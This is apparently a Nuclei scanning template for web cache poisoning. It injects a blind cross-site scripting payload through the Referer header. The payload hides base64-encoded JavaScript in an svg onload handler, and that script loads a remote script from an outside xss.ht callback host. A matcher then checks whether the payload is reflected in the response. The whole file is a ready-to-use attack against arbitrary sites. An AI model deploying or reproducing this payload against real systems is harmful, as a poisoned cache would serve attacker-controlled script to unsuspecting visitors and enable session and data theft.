id: Caching-BXSS

info:
  name: Web cache posoing via header
  author: abdulrahman 
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
#     - "{{BaseURL}}/?param=123"

    headers:
      Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYWJkdWxyYWhtYW4yeC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        condition: or
      - type: word
        part: body
        words:
          - "id=dmFyIGE9ZG9j"
